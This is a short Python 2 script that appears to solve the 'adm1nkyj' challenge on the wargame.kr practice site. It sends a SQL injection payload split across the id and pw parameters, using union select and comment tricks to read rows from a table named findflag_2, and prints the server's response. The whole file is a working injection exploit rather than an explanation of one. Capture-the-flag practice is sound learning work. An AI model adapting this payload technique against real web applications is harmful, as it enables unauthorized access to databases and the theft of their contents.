# -*- coding: utf8 -*-

import urllib, urllib2, time

headers = {'Host': 'wargame.kr:8080'}

data = "?id="
data = data + urllib.quote("' union select 1,x,3,4,5 /*")
data = data + "&pw="
data = data + urllib.quote("*/ from (select 1,2,3,4 as x,5 union select * from findflag_2 ) as x limit 1,1#")

req = urllib2.Request("http://wargame.kr:8080/adm1nkyj/" + data, '', headers)
response = urllib2.urlopen(req)

res = response.read()
print len(res), res